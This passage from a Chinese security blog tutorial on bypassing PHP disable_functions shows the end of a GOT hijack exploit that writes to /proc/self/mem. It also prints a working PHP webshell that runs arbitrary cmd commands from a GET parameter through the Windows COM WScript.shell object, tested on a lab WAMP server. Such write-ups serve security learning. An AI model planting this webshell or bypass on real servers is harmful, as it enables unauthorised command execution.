class="string">&#x27;[*] system@plt addr: 0x&#x27;</span> . dechex(<span class="variable">$system_addr</span>) . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[*] Rewriting open@plt address\n&quot;</span>;</span><br><span class="line"><span class="variable">$mem</span> = fopen(<span class="string">&#x27;/proc/self/mem&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>);</span><br><span class="line">fseek(<span class="variable">$mem</span>, <span class="variable">$pie_base</span> + <span class="variable">$open_php</span>);</span><br><span class="line"><span class="keyword">if</span>(fwrite(<span class="variable">$mem</span>, packlli(<span class="variable">$system_addr</span>))) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[+] Address written. Executing cmd\n&quot;</span>;</span><br><span class="line">    readfile(<span class="string">&#x27;/usr/bin/id&#x27;</span>);</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[-] Write failed. Exiting\n&quot;</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="利用-Windows-系统组件-COM"><a href="#利用-Windows-系统组件-COM" class="headerlink" title="利用 Windows 系统组件 COM"></a>利用 Windows 系统组件 COM</h2><p><strong>原理简介</strong>：</p>
<p>COM（Component Object Model）组件对象模型，是一种跨应用和语言共享二进制代码的方法。COM 可以作为 DLL 被本机程序载入也可以通过 DCOM 被远程进程调用</p>
<p><code>C:WindowsSystem32</code> 下的 <code>wshom.ocx</code> 能够提供 WshShell 对象和 WshNetwork 对象接口的访问，也就是提供对本地 Windows shell 和计算机所连接的网络上共享资源的访问</p>
<p><strong>漏洞利用条件</strong>：</p>
<ul>
<li>Windows系统</li>
<li>php.ini 中开启 <code>com.allow_dcom</code></li>
<li>到 php.ini 中开启拓展<code>extension=php_com_dotnet.dll</code></li>
</ul>
<p><strong>靶场环境</strong>：</p>
<p>在Windows2008R2服务器上搭建WAMP环境。</p>
<p>php.ini 中开启 <code>com.allow_dcom</code></p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">com.allow_dcom</span> = <span class="literal">true</span></span><br></pre></td></tr></table></figure>
<p>因为是在 Windows，如果在拓展文件夹 php/ext/ 中存在 php_com_dotnet.dll</p>
<p>到 php.ini 中开启拓展</p>
<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">extension</span>=php_com_dotnet.dll</span><br></pre></td></tr></table></figure>
<p>重启服务在 phpinfo 中就能看到开启了 <code>com_dotnet</code></p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/lFnKOmA9vUbrkP4.png" alt="image-20220110183757552"></p>
<p><strong>靶场突破</strong>：</p>
<p>上传EXP：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$command</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$wsh</span> = <span class="keyword">new</span> COM(<span class="string">&#x27;WScript.shell&#x27;</span>); <span class="comment">// 生成一个COM对象　Shell.Application也能</span></span><br><span class="line"><span class="variable">$exec</span> = <span class="variable">$wsh</span>-&gt;exec(<span class="string">&quot;cmd /c &quot;</span>.<span class="variable">$command</span>); <span class="comment">//调用对象方法来执行命令</span></span><br><span class="line"><span class="variable">$stdout</span> = <span class="variable">$exec</span>-&gt;StdOut();</span><br><span class="line"><span class="variable">$stroutput</span> = <span class="variable">$stdout</span>-&gt;ReadAll();</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$stroutput</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用上面的 PHP 代码通过 COM 对象的 <code>exec()</code> 方法即可绕过 disable_functions 执行命令。</p>
<p><img src="/img/gif/loading4.gif" data-original="https://s2.loli.net/2022/01/10/7Qpr2NgcHxaXyzw.png" alt="image-20220110184340542"></p>
<hr>
<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/loseheart157/article/details/121021609">简单讲解如何绕过PHP disable_function_h0ld1rs的博客-CSDN博客_disabled function</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/197745">PHP 突破 disable_functions 常用姿势以及使用 Fuzz 挖掘含内部系统调用的函数 - 安全客，安全资讯平台 (anquanke.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://segmentfault.com/a/1190000038646341">php中函数禁用绕过的原理与利用 - SegmentFault 思否</a></li>
<li><a target="_blank" rel="noopener" href="https://www.tr0y.wang/2018/04/18/PHPDisalbedfunc/index.html">PHP disable_functions Bypass 的方法探究 - Tr0y’s Blog</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_32393893/article/details/110468078">PHP之绕过disable_function_shy的博客-CSDN博客_disable_function 绕过</a></li>
<li><a target="_blank" rel="noopener" href="https://my.oschina.net/u/4587690/blog/4452027">disable_functions绕过总结 - 雷神众测的个人空间 - OSCHINA - 中文开源技术交流社区</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/8669#toc-5">ByteCTF WP-无需mail bypass disable_functions - 先知社区 (aliyun.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">Fastcgi协议分析 &amp;&amp; PHP-FPM未授权访问漏洞 &amp;&amp; Exp编写 | 离别歌 (leavesongs.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/75114351">攻击PHP-FPM 实现Bypass Disable Functions - 知乎 (zhihu.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.xlab.app/p/a63cefbc/">蚁剑 disable_functions 研究 | 明天的乌云 (xlab.app)</a></li>
<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42303523/article/details/117911859">使用GCONV<em>PATH与iconv进行bypass disable<em>functions_lesion</em></em>的博客-CSDN博客</a></li>
<li><a target="_blank" rel="noopener" href="https://www.erikten.cn/posts/bbe4cfcb.html">从代码层分析蚁剑“绕过disable_function”插件功能（中） | Erikten</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7990">针对宝塔的RASP及其disable_functions的绕过 - 先知社区 (aliyun.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzU3ODc2NTg1OA==&amp;mid=2247485666&amp;idx=1&amp;sn=71a0cce05637edd488cb9cccb3967504">劫持got表绕过disable_functions (qq.com)</a></li>
<li><a target="_blank" rel="noopener" href="https://security.tencent.com/index.php/blog/msg/166">RASP攻防 —— RASP安全应用与局限性浅析 - 博客 - 腾讯安全应急响应中心 (tencent.com)</a></li>
</ul>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">Ulysses</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://plumeria.ltd/post/ee1189d7.html">https://plumeria.ltd/post/ee1189d7.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://plumeria.ltd" target="_blank">Ulysses'Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/bypass-disable-functions/">bypass disable_functions</a></div><div class="post_share"><div class="social-share" data-image="/img/cover/disable_functions.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/post/9916b941.html"><img class="prev-cover" src="/img/gif/loading4.gif" data-original="/img/cover/disable_functions.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">突破disable_functions执行命令·下</div></div></a></div><div class="next-post pull-right"><a href="/post/763788f5.html"><img class="next-cover" src="/img/gif/loading4.gif" data-original="/img/cover/open_basedir.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">突破open_basedir限制读写文件</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/post/9916b941.html" title="突破disable_functions执行命令·下"><img class="cover" src="/img/gif/loading4.gif" data-original="/img/cover/disable_functions.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-01-12</div><div class="title">突破disable_functions执行命令·下</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/gif/loading4.gif" data-original="https://avatars.githubusercontent.com/u/63300491?v=4" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">Ulysses</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">62</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">9</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/UlyssesTakusen"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">记录学习与生活~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP-disable-functions"><span class="toc-number">1.</span> <span class="toc-text">PHP disable_functions</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E9%BB%91%E5%90%8D%E5%8D%95%E9%81%97%E6%BC%8F%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">2.</span> <span class="toc-text">寻找黑名单遗漏的危险函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-LD-PRELOAD-%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-number">3.</span> <span class="toc-text">利用 LD_PRELOAD 环境变量</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E5%8A%AB%E6%8C%81%E5%87%BD%E6%95%B0"><span class="toc-number">3.1.</span> <span class="toc-text">方法一：劫持函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80%EF%BC%9A%E9%A2%84%E5%8A%A0%E8%BD%BD%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1"><span class="toc-number">3.2.</span> <span class="toc-text">方法一：预加载共享对象</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-GCONV-PATH-%E4%B8%8E-iconv"><span class="toc-number">4.</span> <span class="toc-text">利用 GCONV_PATH 与 iconv</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Apache-Mod-CGI"><span class="toc-number">5.</span> <span class="toc-text">利用 Apache Mod CGI</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%BB%E5%87%BB-PHP-FPM-%E7%9B%91%E5%90%AC%E7%AB%AF%E5%8F%A3"><span class="toc-number">6.</span> <span class="toc-text">攻击 PHP-FPM 监听端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-PHP7-4-FFI-%E6%89%A9%E5%B1%95%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-number">7.</span> <span class="toc-text">利用 PHP7.4 FFI 扩展执行命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%AB%E6%8C%81-GOT-%E8%A1%A8"><span class="toc-number">8.</span> <span class="toc-text">劫持 GOT 表</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8-Windows-%E7%B3%BB%E7%BB%9F%E7%BB%84%E4%BB%B6-COM"><span class="toc-number">9.</span> <span class="toc-text">利用 Windows 系统组件 COM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">10.</span> <span class="toc-text">参考资料</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/post/4089de4e.html" title="文件包含漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/inclusion.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件包含漏洞"/></a><div class="content"><a class="title" href="/post/4089de4e.html" title="文件包含漏洞">文件包含漏洞</a><time datetime="2022-01-29T08:00:00.000Z" title="发表于 2022-01-29 16:00:00">2022-01-29</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/5617fd8e.html" title="文件删除漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/file_delete.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件删除漏洞"/></a><div class="content"><a class="title" href="/post/5617fd8e.html" title="文件删除漏洞">文件删除漏洞</a><time datetime="2022-01-25T12:00:00.000Z" title="发表于 2022-01-25 20:00:00">2022-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/9b550335.html" title="文件读取下载漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/file_read.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件读取下载漏洞"/></a><div class="content"><a class="title" href="/post/9b550335.html" title="文件读取下载漏洞">文件读取下载漏洞</a><time datetime="2022-01-25T09:00:00.000Z" title="发表于 2022-01-25 17:00:00">2022-01-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/f91abec7.html" title="编辑器文件上传漏洞"><img src="/img/gif/loading4.gif" data-original="/img/cover/upload.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="编辑器文件上传漏洞"/></a><div class="content"><a class="title" href="/post/f91abec7.html" title="编辑器文件上传漏洞">编辑器文件上传漏洞</a><time datetime="2022-01-23T14:00:00.000Z" title="发表于 2022-01-23 22:00:00">2022-01-23</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/post/d5e40e85.html" title="文件上传漏洞之WAF拦截绕过"><img src="/img/gif/loading4.gif" data-original="/img/cover/upload2.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="文件上传漏洞之WAF拦截绕过"/></a><div class="content"><a class="title" href="/post/d5e40e85.html" title="文件上传漏洞之WAF拦截绕过">文件上传漏洞之WAF拦截绕过</a><time datetime="2022-01-22T06:00:00.000Z" title="发表于 2022-01-22 14:00:00">2022-01-22</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Ulysses</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="algolia-search"><div class="search-dialog"><div class="search-dialog__title" id="algolia-search-title">Algolia</div><div id="algolia-input-panel"><div id="algolia-search-input"></div></div><hr/><div id="algolia-search-results"><div id="algolia-hits"></div><div id="algolia-pagination"></div><div id="algolia-stats"></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/search/algolia.js"></script><script>var preloader = {
  endLoading: () => {
    document.body.style.overflow = 'auto';
    document.getElementById('loading-box').classList.add("loaded")
  },
  initLoading: () => {
    document.body.style.overflow = '';
    document.getElementById('loading-box').classList.remove("loaded")

  }
}
window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'iuIup4lvgEwLDu3U8Qc3GOXd-gzGzoHsz',
      appKey: 'Ls9mJKS2MmvbfsPbPCeb2cnA',
      placeholder: 'Please leave your footprints',
      avatar: 'monsterid',
      meta: 'nick,mail,link'.split(','),
      pageSize: '10',
      lang: 'zh-CN',
      recordIP: false,
      serverURLs: '',
      emojiCDN: '',
      emojiMaps: "",
      enableQQ: false,
      master: '5671db8c5f953943b68468c62e317e7e,007d3a0fdf1072ff1db83a005457a3c9,503ee756200f9eba794e5467c89e98f8,048233cc2ce6903ca93ba6e0597462ae'.split(','),
      friends: ''.split(','),
      tagMeta: '博主,小伙伴,访客'.split(','),
      path: window.location.pathname,
      requiredFields: ["nick,mail"],
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/gh/HCLonely/Valine@latest/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !true) {
  if (true) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script></div><script src="/js/smooth-scrolling.js"></script><script src="https://cdn.jsdelivr.net/npm/pjax/pjax.min.js"></script><script>let pjaxSelectors = [
  'title',
  '#config-diff',
  '#body-wrap',
  '#rightside-config-hide',
  '#rightside-config-show',
  '.js-pjax'
]

if (false) {
  pjaxSelectors.unshift('meta[property="og:image"]', 'meta[property="og:title"]', 'meta[property="og:url"]')
}

var pjax = new Pjax({
  elements: 'a:not([target="_blank"])',
  selectors: pjaxSelectors,
  cacheBust: false,
  analytics: false,
  scrollRestoration: false
})

document.addEventListener('pjax:send', function () {

  // removeEventListener scroll 
  window.removeEventListener('scroll', window.tocScrollFn)
  window.removeEventListener('scroll', scrollCollect)

  typeof preloader === 'object' && preloader.initLoading()
  
  if (window.aplayers) {
    for (let i = 0; i < window.aplayers.length; i++) {
      if (!window.aplayers[i].options.fixed) {
        window.aplayers[i].destroy()
      }
    }
  }

  typeof typed === 'object' && typed.destroy()

  //reset readmode
  const $bodyClassList = document.body.classList
  $bodyClassList.contains('read-mode') && $bodyClassList.remove('read-mode')

})

document.addEventListener('pjax:complete', function () {
  window.refreshFn()

  document.querySelectorAll('script[data-pjax]').forEach(item => {
    const newScript = document.createElement('script')
    const content = item.text || item.textContent || item.innerHTML || ""
    Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
    newScript.appendChild(document.createTextNode(content))
    item.parentNode.replaceChild(newScript, item)
  })

  GLOBAL_CONFIG.islazyload && window.lazyLoadInstance.update()

  typeof chatBtnFn === 'function' && chatBtnFn()
  typeof panguInit === 'function' && panguInit()

  // google analytics
  typeof gtag === 'function' && gtag('config', '', {'page_path': window.location.pathname});

  // baidu analytics
  typeof _hmt === 'object' && _hmt.push(['_trackPageview',window.location.pathname]);

  typeof loadMeting === 'function' && document.getElementsByClassName('aplayer').length && loadMeting()

  // Analytics
  if (false) {
    MtaH5.pgv()
  }

  // prismjs
  typeof Prism === 'object' && Prism.highlightAll()

  typeof preloader === 'object' && preloader.endLoading()
})

document.addEventListener('pjax:error', (e) => {
  if (e.request.status === 404) {
    pjax.loadUrl('/404.html')
  }
})</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
  function butterfly_clock_injector_config(){
    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
    var item_html = '<div class="card-widget card-clock"><div class="card-glass"><div class="card-background"><div class="card-content"><div id="hexo_electric_clock"><img class="entered loading" id="card-clock-loading" src="/img/gif/loading4.gif" data-original="/img/loading.gif" style="height: 120px; width: 100%;" data-ll-status="loading"/></div></div></div></div></div>';
    console.log('已挂载butterfly_clock')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'null'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_clock_injector_config();
  }
  else if (epage === cpage){
    butterfly_clock_injector_config();
  }
  </script><script src="https://pv.sohu.com/cityjson?ie=utf-8"></script><script data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-clock/lib/clock.min.js"></script><script data-pjax>
  function butterfly_swiper_injector_config(){
    var parent_div_git = document.getElementById('recent-posts');
    var item_html = '<div class="recent-post-item" style="height: auto;width: 100%"><div class="blog-slider swiper-container-fade swiper-container-horizontal" id="swiper_container"><div class="blog-slider__wrp swiper-wrapper" style="transition-duration: 0ms;"><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e2e31796.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/yunsuo.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-23</span><a class="blog-slider__title" href="post/e2e31796.html" alt="">WAF-Bypass之SQL注入绕过云锁</a><div class="blog-slider__text">本文主要介绍:如何科学地绕过云锁WAF</div><a class="blog-slider__button" href="post/e2e31796.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/7c4159f7.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/wafbypass.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-11-01</span><a class="blog-slider__title" href="post/7c4159f7.html" alt="">WAF-Bypass之SQL注入绕过思路总结</a><div class="blog-slider__text">本文主要介绍:从四个角度分析绕过WAF</div><a class="blog-slider__button" href="post/7c4159f7.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/e6a9f884.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/webshell2.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-12-23</span><a class="blog-slider__title" href="post/e6a9f884.html" alt="">WebShell检测绕过之下·有的放矢</a><div class="blog-slider__text">本文主要介绍:本文针对国内主流查杀引擎进行分析，通过绕过Source点、Sink点与绕过数据流处理检测对Webshell进行科学免杀</div><a class="blog-slider__button" href="post/e6a9f884.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/c2f49bfa.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/mysql.jpg" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2021-10-06</span><a class="blog-slider__title" href="post/c2f49bfa.html" alt="">MySQL数据库注入攻击方式</a><div class="blog-slider__text">本文主要介绍:MySQL数据库的注入与提取利用</div><a class="blog-slider__button" href="post/c2f49bfa.html" alt="">详情   </a></div></div><div class="blog-slider__item swiper-slide" style="width: 750px; opacity: 1; transform: translate3d(0px, 0px, 0px); transition-duration: 0ms;"><a class="blog-slider__img" href="post/d5e40e85.html" alt=""><img width="48" height="48" src="/img/gif/loading4.gif" data-original="/img/cover/upload2.png" alt="" onerror="this.src=https://cdn.jsdelivr.net/npm/akilar-candyassets/image/loading.gif; this.onerror = null;"/></a><div class="blog-slider__content"><span class="blog-slider__code">2022-01-22</span><a class="blog-slider__title" href="post/d5e40e85.html" alt="">文件上传漏洞之WAF拦截绕过</a><div class="blog-slider__text">本文主要介绍:常见的文件上传绕过WAF的手法，最后再使用目前最新版的安全狗进行绕过演示。</div><a class="blog-slider__button" href="post/d5e40e85.html" alt="">详情   </a></div></div></div><div class="blog-slider__pagination swiper-pagination-clickable swiper-pagination-bullets"></div></div></div>';
    console.log('已挂载butterfly_swiper')
    parent_div_git.insertAdjacentHTML("afterbegin",item_html)
    }
  var elist = 'undefined'.split(',');
  var cpage = location.pathname;
  var epage = 'all';
  var flag = 0;

  for (var i=0;i<elist.length;i++){
    if (cpage.includes(elist[i])){
      flag++;
    }
  }

  if ((epage ==='all')&&(flag == 0)){
    butterfly_swiper_injector_config();
  }
  else if (epage === cpage){
    butterfly_swiper_injector_config();
  }
  </script><script defer src="https://cdnjs.cloudflare.com/ajax/libs/Swiper/4.1.6/js/swiper.min.js"></script><script defer data-pjax src="https://cdn.jsdelivr.net/npm/hexo-butterfly-swiper/lib/swiper_init.js"></script><script defer src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer src="https://cdn.jsdelivr.net/npm/hexo-tag-plugins@latest/lib/mindmap.min.js"></script><script async src="//at.alicdn.com/t/font_2032782_8d5kxvn09md.js"></script><!-- hexo injector body_end end --><script>
            window.imageLazyLoadSetting = {
                isSPA: false,
                preloadRatio: 1,
                processImages: null,
            };
        </script><script>window.addEventListener("load",function(){var t=/\.(gif|jpg|jpeg|tiff|png)$/i,r=/^data:image\/[a-z]+;base64,/;Array.prototype.slice.call(document.querySelectorAll("img[data-original]")).forEach(function(a){var e=a.parentNode;"A"===e.tagName&&(e.href.match(t)||e.href.match(r))&&(e.href=a.dataset.original)})});</script><script>!function(n){n.imageLazyLoadSetting.processImages=o;var e=n.imageLazyLoadSetting.isSPA,i=n.imageLazyLoadSetting.preloadRatio||1,r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]"));function o(){e&&(r=Array.prototype.slice.call(document.querySelectorAll("img[data-original]")));for(var t,a=0;a<r.length;a++)0<=(t=(t=r[a]).getBoundingClientRect()).bottom&&0<=t.left&&t.top<=(n.innerHeight*i||document.documentElement.clientHeight*i)&&function(){var t,e,n,i,o=r[a];t=o,e=function(){r=r.filter(function(t){return o!==t})},n=new Image,i=t.getAttribute("data-original"),n.onload=function(){t.src=i,e&&e()},t.src!==i&&(n.src=i)}()}o(),n.addEventListener("scroll",function(){var t,e;t=o,e=n,clearTimeout(t.tId),t.tId=setTimeout(function(){t.call(e)},500)})}(this);</script></body></html>